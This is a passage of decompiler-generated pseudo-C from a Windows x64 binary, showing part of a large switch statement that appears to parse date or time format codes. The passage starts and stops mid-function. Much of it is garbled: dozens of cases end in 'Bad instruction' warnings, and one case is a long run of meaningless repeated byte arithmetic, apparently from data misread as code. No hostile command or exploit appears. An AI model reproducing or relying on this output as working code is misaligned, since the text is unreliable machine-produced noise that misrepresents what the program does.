ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 0x1c) = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 4;\n                arg1_02 = in_stack_00000038;\n            }\n            break;\n        case 0x48:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 0xc);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT210(uStack398, CONCAT28(uStack400, CONCAT44(uStack404, uStack408))));\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            uStackY576 = 0x140068d6b;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 2) = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 8;\n                arg1_02 = in_stack_00000038;\n            }\n            break;\n        case 0x49:\n        case 0x4f:\n            while( true ) {\n                uStackY576 = 0x140068517;\n                cVar3 = fcn.140029ee0(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n                if (cVar3 != '\\0') break;\n                uStackY576 = 0x1400684d8;\n                fcn.140029f90(&stack0xfffffffffffffe78);\n                pauVar36 = *ppauVar13;\n                uStackY576 = 0x1400684ec;\n                cVar3 = (**pauVar36[1])(ppauVar13);\n                if (cVar3 == '\\0') break;\n                uStackY576 = 0x140068503;\n                fcn.14009c0a0(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffff;\n            }\ncode_r0x00014006851b:\n            ppauVar29 = uStack384;\n            noname_11 = noname_11 & 0xffffffffffff0000 | uStack400;\n            auStack424 = pauVar36;\n            pauVar36 = CONCAT44(uStack388, uStack392);\n            break;\n        case 0x4b:\n            pauStack360 = *(*(arg_70h + 0x10) + 0x40);\n            piStack352 = *(*(arg_70h + 0x10) + 0x48);\n            if ((**pauStack360 == 0) || (*piStack352 == 0)) {\n                pauVar36 = CONCAT44(uStack388, uStack392);\n            }\n            else {\n                in_stack_fffffffffffffe08 = &stack0xfffffffffffffe90;\n                in_stack_fffffffffffffdf8 = NULL;\n                auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n                auStack440_00 = CONCAT412(uStack380, auStack440);\n                in_stack_fffffffffffffe38 =\n                     CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n                uStackY576 = 0x14006972d;\n                fcn.140066d40(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38, \n                              &stack0xfffffffffffffe94, &stack0xfffffffffffffe98, 2, in_stack_00000028, \n                              in_stack_fffffffffffffe08, in_stack_fffffffffffffe10, uVar14, noname_11, arg_70h, \n                              CONCAT44(in_stack_fffffffffffffe34, uVar42), CONCAT44(uStack404, uStack408), \n                              SUB168(in_stack_fffffffffffffe38 >> 0x40, 0), CONCAT44(uStack388, uStack392));\n                ppauVar29 = uStack416;\n                uStack392 = SUB164(_auStack424, 0);\n                uStack388 = SUB164(_auStack424 >> 0x20, 0);\n                uStack384 = uStack416;\n                pauVar36 = auStack424;\n                uVar42 = uStack368;\n                if ((uStack368 == 0) && (uStack364 != 0)) {\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                }\n            }\n            break;\n        case 0x4d:\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            goto code_r0x000140068594;\n        case 0x52:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 6);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x14006902f;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            uStack384 = uStack416;\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000038 + 3) = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n                arg1_02 = in_stack_00000038;\n            }\n            break;\n        case 0x53:\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\ncode_r0x000140068594:\n            uStackY576 = 0x1400685d5;\n            in_stack_fffffffffffffdf8 = in_stack_00000038;\n            in_stack_fffffffffffffe08 = in_stack_00000048;\n            fcn.1400679d0(&stack0xfffffffffffffe58, arg2);\n            uStack384 = uStack416;\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            break;\n        case 0x54:\n            in_stack_fffffffffffffe10 = &stack0xfffffffffffffe90;\n            in_stack_fffffffffffffdf8 = CONCAT44(uVar41, 99);\n            auStack440 = CONCAT48(CONCAT22(uStack382, uStack384), CONCAT44(uStack388, uStack392));\n            auStack440_00 = CONCAT412(uStack380, auStack440);\n            in_stack_fffffffffffffe38 =\n                 CONCAT412(uStack396, CONCAT48(CONCAT22(uStack398, uStack400), CONCAT44(uStack404, uStack408)));\n            uStackY576 = 0x140068f23;\n            in_stack_fffffffffffffe08 = in_stack_00000028;\n            fcn.140066810(&stack0xfffffffffffffe58, arg2, &stack0xfffffffffffffe48, &stack0xfffffffffffffe38);\n            ppauVar29 = uStack416;\n            uStack392 = SUB164(_auStack424, 0);\n            uStack388 = SUB164(_auStack424 >> 0x20, 0);\n            uStack384 = uStack416;\n            pauVar36 = auStack424;\n            uVar42 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                uStackY576 = 0x140069622;\n                cVar3 = fcn.140029ee0(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n                uVar9 = uStack364;\n                if (cVar3 == '\\0') {\n                    uStackY576 = 0x14006978d;\n                    fcn.140029f90(&stack0xfffffffffffffe78);\n                    uStackY576 = 0x1400697a0;\n                    iVar11 = (**(*ppauVar13)[6])(ppauVar13);\n                    ppauVar12 = iVar11 - 0x30U;\n                    uVar32 = iVar11 - 0x30U;\n                    if (9 < uVar32) goto code_r0x000140069631;\n                    ppauVar12 = uVar32;\n                    uStackY576 = 0x1400697c4;\n                    fcn.14009c0a0(CONCAT44(uStack388, uStack392));\n                    uStack384 = 0xffff;\n                    uVar9 = uVar32 + uVar9 * 10;\n                    uStackY576 = 0x1400697e6;\n                    uStack364 = uVar9;\n                    cVar3 = fcn.140029ee0(&stack0xfffffffffffffe78, &stack0xfffffffffffffe68);\n                    if (cVar3 == '\\0') {\n                        uStackY576 = 0x140069809;\n                        fcn.140029f90(&stack0xfffffffffffffe78);\n                        uStackY576 = 0x14006981c;\n                        cVar3 = (**(*ppauVar13)[6])(ppauVar13);\n                        if (cVar3 - 0x30U < 10) {\n                            uStackY576 = 0x140069837;\n                            fcn.14009c0a0(CONCAT44(uStack388, uStack392));\n                            uStack384 = 0xffff;\n                            uVar9 = uVar9 * 10 + (cVar3 - 0x30U);\n                        }\n                    }\n                    arg1_02 = uVar9 - 0x76c;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                }\n                else {\ncode_r0x000140069631:\n                    arg1_02 = uVar9;\n                    if (uVar9 < 0x45) {\n                        arg1_02 = uVar9 + 100;\n                    }\n                }\n                ppauVar29 = uStack384;\n                *(in_stack_00000038 + 0x14) = arg1_02;\n                noname_11 = noname_11 & 0xffffffffffff0000 | uStack400;\n                pauVar36 = CONCAT44(uStack388, uStack392);\n            }\n            break;\n        case 0x55:\n            goto code_r0x00014006f2ab;\n        case 0x56:\n            *arg1_01 = *arg1_01 + uVar4;\n            uVar4 = uVar4 + (ppauVar25 >> 8);\n            pcVar21 = arg1_01 & 0xffffffffffffff00 | uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            goto code_r0x00014006ebb1;\n        case 0x57:\n            goto code_r0x00014006eb6c;\n        case 0x58:\n            uVar14 = iVar11 + 0x4010be48;\n            uStackY576 = 0x14006eb2c;\n            _auStack424 = auVar40;\n            ppauStack296 = ppauVar25;\n            fcn.1400b9850(uVar14);\n            uStackY576 = 0x14006eb3d;\n            iVar17 = fcn.14002c080(0x140108460);\n            piVar34 = *(*(CONCAT44(uStack260, uStack264) + 0xd0) + 0x18) + iVar17 * 8;\n            iVar15 = *piVar34;\n            if (iVar15 == 0) {\n                uStackY576 = 0x14006f83a;\n                puVar20 = fcn.1400bc710(0x80);\n                *(puVar20 + 1) = 0;\n                *puVar20 = 0x1401188b0;\n                puVar20[2] = 0;\n                puVar20[3] = 0;\n                *(puVar20 + 4) = 0;\n                *(puVar20 + 0x22) = 0;\n                puVar20[5] = 0;\n                puVar20[6] = 0;\n                puVar20[7] = 0;\n                puVar20[8] = 0;\n                puVar20[9] = 0;\n                puVar20[10] = 0;\n                *(puVar20 + 0xb) = 0;\n                *(puVar20 + 0x5c) = 0;\n                *(puVar20 + 0x7a) = 0;\n                uStackY576 = 0x14006f8b8;\n                fcn.1400a15e0(puVar20, uVar14);\n                uStackY576 = 0x14006f8d2;\n                fcn.1400a38f0(*(CONCAT44(uStack260, uStack264) + 0xd0), puVar20, iVar17);\n                iVar15 = *piVar34;\n            }\n            arg1_01 = *(iVar15 + 0x40);\n            auStack440_00 = in_XMM1;\n            goto code_r0x00014006eb6c;\n        case 0x59:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x5a:\n            *arg1_01 = *arg1_01 + uVar4;\n            piVar34 = in_stack_00000040 + iVar15;\n            goto code_r0x00014006e289;\n        case 0x5b:\n            goto code_r0x00014006dba1;\n        case 0x5c:\n        case 0x5d:\n            *(iVar16 + 0x14010bd03) = *(iVar16 + 0x14010bd03) + ppauVar25;\n            *arg1_01 = *arg1_01 + iVar10;\n            auStack440_00 = *pauVar36;\n            uStackY576 = 0x14006db1c;\n            _auStack424 = auVar40;\n            ppauStack296 = ppauVar25;\n            fcn.1400b9850(iVar16 + 0x14010be48);\n            uStackY576 = 0x14006db2d;\n            iVar17 = fcn.14002c080(0x140108450);\n            piVar34 = *(*(CONCAT44(uStack260, uStack264) + 0xd0) + 0x18) + iVar17 * 8;\n            iVar15 = *piVar34;\n            if (iVar15 == 0) {\n                uStackY576 = 0x14006e82a;\n                puVar20 = fcn.1400bc710(0x80);\n                *(puVar20 + 1) = 0;\n                *puVar20 = 0x140118890;\n                puVar20[2] = 0;\n                puVar20[3] = 0;\n                *(puVar20 + 4) = 0;\n                *(puVar20 + 0x22) = 0;\n                puVar20[5] = 0;\n                puVar20[6] = 0;\n                puVar20[7] = 0;\n                puVar20[8] = 0;\n                puVar20[9] = 0;\n                puVar20[10] = 0;\n                *(puVar20 + 0xb) = 0;\n                *(puVar20 + 0x5c) = 0;\n                *(puVar20 + 0x7a) = 0;\n                uStackY576 = 0x14006e8a8;\n                fcn.1400a0dc0(puVar20, iVar16 + 0x14010be48);\n                uStackY576 = 0x14006e8c2;\n                fcn.1400a38f0(*(CONCAT44(uStack260, uStack264) + 0xd0), puVar20, iVar17);\n                iVar15 = *piVar34;\n            }\n            if (*(iVar15 + 0x40) == 0) {\n                uVar19 = SUB168(in_stack_fffffffffffffe38 >> 0x40, 0);\n            }\n            else {\n                uVar19 = SUB168(CONCAT115(*(iVar15 + 0x50) != 0, SUB1615(in_stack_fffffffffffffe38, 0)) >> 0x40, 0);\n            }\n            arg1_02 = &stack0xfffffffffffffe80;\n            uStackY576 = 0x14006db80;\n            uVar18 = fcn.14007b890(0, 0);\n            uStack392 = uVar18;\n            uStack388 = uVar18 >> 0x20;\n            if (*(iVar15 + 0x20) != '\\0') {\n                uStackY576 = 0x14006dba1;\n                fcn.14007d790(&stack0xfffffffffffffe78, 0x20);\n            }\ncode_r0x00014006dba1:\n            auVar40 = CONCAT88(uVar19, &stack0xfffffffffffffe73);\n            uStackY576 = 0x14006dbba;\n            uVar19 = fcn.14007b890(0, 0);\n            uStack384 = uVar19;\n            uStack382 = uVar19 >> 0x10;\n            uStack380 = uVar19 >> 0x20;\n            uStackY576 = 0x14006dbcf;\n            fcn.14007d790(arg1_02, 0x20);\n            ppauVar29 = NULL;\n            uStack396 = *(iVar15 + 0x60);\n            in_stack_fffffffffffffe08 = NULL;\n            arg_70h = &stack0xfffffffffffffe74;\n            uVar14 = 0;\n            in_stack_fffffffffffffe38 =\n                 CONCAT115(SUB161(auVar40 >> 0x78, 0), \n                           ZEXT1415(SUB1614(CONCAT412(SUB164(CONCAT214(SUB162(auVar40 >> 0x70, 0), \n                                                                       ZEXT1314(SUB1613(auVar40, 0))) >> 0x60, 0), \n                                                      ZEXT812(SUB168(auVar40, 0))), 0)));\n            goto code_r0x00014006dc22;\n        case 0x5e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x5f:\n        case 0x60:\n        case 0x61:\n        case 0x80:\n        case 0x81:\n        case 0x8f:\n        case 0xd8:\n        case 0xd9:\n        case 0xe5:\n        case 0xee:\n        case 0xef:\n        case 0xf0:\n        case 0xf1:\n            puVar30 = &stack0xfffffffffffffdc0;\n            cVar3 = '\\x01';\n            do {\n                ppauVar12 = ppauVar12 + -4;\n                puVar30 = puVar30 + -1;\n                *puVar30 = *ppauVar12;\n                cVar3 = cVar3 + -1;\n            } while ('\\0' < cVar3);\n            *0xc310b339 = *0xc310b339 + 8;\n            goto code_r0x00014010bde0;\n        case 0x62:\n        case 0x82:\n        case 0x90:\n        case 0xa1:\n        case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 99:\n        case 0x83:\n        case 0x91:\n        case 0xa2:\n        case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 100:\n        case 0x7d:\n        case 0x7f:\n        case 0x84:\n        case 0x92:\n        case 0xa3:\n        case 0xd5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x65:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x66:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x67:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6b:\n        case 0x96:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6c:\n        case 0x8b:\n        case 0x97:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6d:\n        case 0x98:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x6f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x70:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x71:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x72:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x73:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x74:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x75:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x76:\n        case 0xb8:\n        case 0xc9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x77:\n        case 0xb9:\n        case 0xca:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x78:\n        case 0xba:\n        case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7a:\n        case 0xa7:\n        case 0xac:\n        case 0xbe:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7b:\n        case 0xa8:\n        case 0xad:\n        case 0xbf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x7e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x85:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x86:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x87:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x88:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x89:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8e:\n            *0xc310b339 = *0xc310b339 + 1;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x93:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x95:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x99:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9c:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa6:\n        case 0xab:\n        case 0xbd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xae:\n        case 0xc0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xaf:\n        case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb0:\n        case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb3:\n        case 0xc4:\n        case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb4:\n        case 0xc5:\n        case 0xcf:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb5:\n        case 0xc6:\n        case 0xd0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xb7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 200:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xda:\n        case 0xde:\n        case 0xe6:\n        case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdb:\n        case 0xdf:\n        case 0xe7:\n        case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdc:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xdd:\n            puVar1 = iVar16 + 0x14010bdba;\n            uVar32 = *puVar1;\n            *puVar1 = *puVar1 + uVar4;\n            *(iVar16 + 0x14010bd79) = *(iVar16 + 0x14010bd79) + iVar10 + CARRY1(uVar32, uVar4);\n            *arg1_01 = *arg1_01 + uVar4;\n            *arg1_01 = *arg1_01 + uVar4;\n            *arg1_01 = *arg1_01 + uVar4;\n            *0x14010bd78 = *0x14010bd78 + uVar4;\n            *arg1_01 = *arg1_01 + uVar4;\n            *arg1_01 = *arg1_01 + 0x78;\n            uVar26 = *ppauVar25 & 0x78;\n            puVar27 = CONCAT71(0x14010bd, uVar26);\n            *arg1_01 = *arg1_01 + iVar10;\n            *arg1_01 = *arg1_01 + uVar4;\n            uVar4 = uVar4 + *arg1_01;\n            uVar14 = arg1_01 & 0xffffffffffffff00;\n            pcVar21 = uVar14 | uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            uVar24 = uVar14 >> 8;\n            *ppauVar25 = *ppauVar25 ^ uVar24;\n            *(pcVar21 + 1) = *(pcVar21 + 1) + pcVar21;\n            *pcVar21 = *pcVar21 + uVar4;\n            uVar32 = *puVar27;\n            *puVar27 = *puVar27 + uVar4;\n            *pcVar21 = (*pcVar21 - uVar4) - CARRY1(uVar32, uVar4);\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            pcVar21[0x140115e] = pcVar21[0x140115e] + uVar24;\n            *pcVar21 = *pcVar21 + uVar4;\n            pcVar21[0x1401142] = pcVar21[0x1401142] + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            pcVar21[0x140115e] = pcVar21[0x140115e] + uVar24;\n            *pcVar21 = *pcVar21 + uVar4;\n            pcVar21[0x1401142] = pcVar21[0x1401142] + uVar24;\n            *pcVar21 = *pcVar21 + uVar4;\n            pcVar21[0x140115e] = pcVar21[0x140115e] + uVar24;\n            *pcVar21 = *pcVar21 + uVar4;\n            uVar32 = uVar4 * '\\x02';\n            pcVar21 = uVar14 | uVar32;\n            *(pcVar21 + 1) = *(pcVar21 + 1) + pcVar21 + CARRY1(uVar4, uVar4);\n            *pcVar21 = *pcVar21 + uVar32;\n            pcVar21[0x140115f] = pcVar21[0x140115f] + uVar26;\n            *pcVar21 = *pcVar21 + uVar32;\n            uVar4 = uVar32 + uVar24;\n            pcVar21 = uVar14 | uVar4;\n            *(pcVar21 + 1) = *(pcVar21 + 1) + pcVar21 + CARRY1(uVar32, uVar24);\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *puVar27 = *puVar27 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            puVar1 = pcVar21 + 0x21;\n            uVar32 = *puVar1;\n            *puVar1 = *puVar1 + uVar4;\n            *(pcVar21 + 1) = *(pcVar21 + 1) + pcVar21 + CARRY1(uVar32, uVar4);\n            *pcVar21 = *pcVar21 + uVar4;\n            *puVar27 = *puVar27 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            *pcVar21 = *pcVar21 + uVar4;\n            uVar5 = uVar4 + uVar24;\n            puVar22 = uVar14 | uVar5;\n            iVar11 = puVar22;\n            *(puVar22 + 1) = *(puVar22 + 1) + iVar11 + CARRY1(uVar4, uVar24);\n            *puVar22 = *puVar22 + uVar5;\n            *puVar27 = *puVar27 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            puVar22[0x140115f] = puVar22[0x140115f] + uVar26;\n            *puVar22 = *puVar22 + uVar5;\n            uVar32 = *puVar22;\n            *puVar22 = *puVar22 + uVar5;\n            *(iVar17 + 1) = *(iVar17 + 1) + iVar11 + CARRY1(uVar32, uVar5);\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar27 = *puVar27 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            puVar1 = puVar22 + 0x21;\n            uVar32 = *puVar1;\n            *puVar1 = *puVar1 + uVar5;\n            *(puVar22 + 1) = *(puVar22 + 1) + iVar11 + CARRY1(uVar32, uVar5);\n            *puVar22 = *puVar22 + uVar5;\n            *puVar27 = *puVar27 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            *puVar22 = *puVar22 + uVar5;\n            uVar4 = uVar5 + uVar24;\n            puVar22 = uVar14 | uVar4;\n            iVar11 = puVar22;\n            *(puVar22 + 1) = *(puVar22 + 1) + iVar11 + CARRY1(uVar5, uVar24);\n            *puVar22 = *puVar22 + uVar4;\n            *puVar27 = *puVar27 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            puVar22[0x140115f] = puVar22[0x140115f] + uVar26;\n            *puVar22 = *puVar22 + uVar4;\n            uVar32 = *puVar22;\n            *puVar22 = *puVar22 + uVar24;\n            *(iVar17 + 1) = *(iVar17 + 1) + iVar11 + CARRY1(uVar32, uVar24);\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar27 = *puVar27 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            puVar1 = puVar22 + 0x21;\n            uVar32 = *puVar1;\n            *puVar1 = *puVar1 + uVar4;\n            *(puVar22 + 1) = *(puVar22 + 1) + iVar11 + CARRY1(uVar32, uVar4);\n            *puVar22 = *puVar22 + uVar4;\n            *puVar27 = *puVar27 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            uVar5 = uVar4 + uVar24;\n            pcVar21 = uVar14 | uVar5;\n            iVar11 = pcVar21;\n            *(pcVar21 + 1) = *(pcVar21 + 1) + iVar11 + CARRY1(uVar4, uVar24);\n            *pcVar21 = *pcVar21 + uVar5;\n            *puVar27 = *puVar27 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            